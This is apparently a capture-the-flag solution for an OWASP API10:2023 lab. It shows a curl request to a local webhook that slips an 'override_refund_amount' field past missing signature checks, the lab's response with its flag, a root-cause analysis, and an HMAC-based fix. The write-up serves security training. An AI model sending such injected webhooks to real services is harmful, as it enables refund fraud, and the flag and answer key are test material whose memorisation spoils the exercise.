# Solution: API10:2023 Unsafe Consumption of APIs

## 1. Walkthrough & Exploitation

### Step 1: Send Unauthenticated Webhook with Injected Refund
```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/webhooks/shipping-update \
  -H "Content-Type: application/json" \
  -d '{"order_id": 1, "status": "delivered", "override_refund_amount": 1000.0}'
```

### Exploit Evidence
```json
{
  "status": "callback_processed",
  "order_id": 1,
  "order_status": "delivered",
  "injected_refund_applied": true,
  "flag": "FLAG{API10_UNSAFE_CONSUMPTION_PAYLOAD_POISONED_1145}"
}
```

---

## 2. Root Cause Analysis
The courier webhook endpoint accepted raw JSON payloads without verifying origin or message integrity (missing HMAC signature validation) and processed unexpected high-impact properties (`override_refund_amount`) without schema constraints.

---

## 3. Patched Implementation
```python
# FIX: API10-Unsafe-Consumption
if not x_partner_signature:
    raise HTTPException(status_code=401, detail="Missing X-Partner-Signature header.")

expected_signature = hmac.new(
    PARTNER_WEBHOOK_SECRET.encode("utf-8"),
    raw_body,
    hashlib.sha256,
).hexdigest()

if not hmac.compare_digest(x_partner_signature, expected_signature):
    raise HTTPException(status_code=401, detail="Invalid HMAC signature.")

# Validate strictly against safe schema
validated = SafeShippingWebhookPayload(**data)
```
